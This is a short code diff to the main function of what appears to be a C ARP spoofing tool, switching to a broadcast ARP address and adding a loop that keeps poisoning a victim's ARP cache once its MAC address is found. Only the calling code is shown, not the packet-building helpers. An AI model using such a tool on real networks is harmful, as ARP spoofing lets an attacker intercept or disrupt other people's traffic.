@@ -12,7 +12,7 @@ int main(int ac, char **av)
 {
     params_t *params = parse(ac, av);
     int local_socket = create_socket();
-    struct sockaddr_ll *arp_sockaddr = create_arp_socketaddr(params);
+    struct sockaddr_ll *arp_sockaddr = create_broadcast_arp_socketaddr(params);
     arp_hdr_t *arp = create_arp_packet(params, local_socket);
     char *packet = create_sendable_packet(arp, arp_sockaddr, params);
     unsigned char *victim_mac_addr = NULL;
@@ -21,6 +21,7 @@ int main(int ac, char **av)
     victim_mac_addr = process_arp_spoofing(packet, arp_sockaddr);
     if (victim_mac_addr) {
         print_victim_mac_addr(victim_mac_addr);
+        spoofing_loop(params, (char *) victim_mac_addr, arp);
         free(victim_mac_addr);
     }
     delete_params(params);
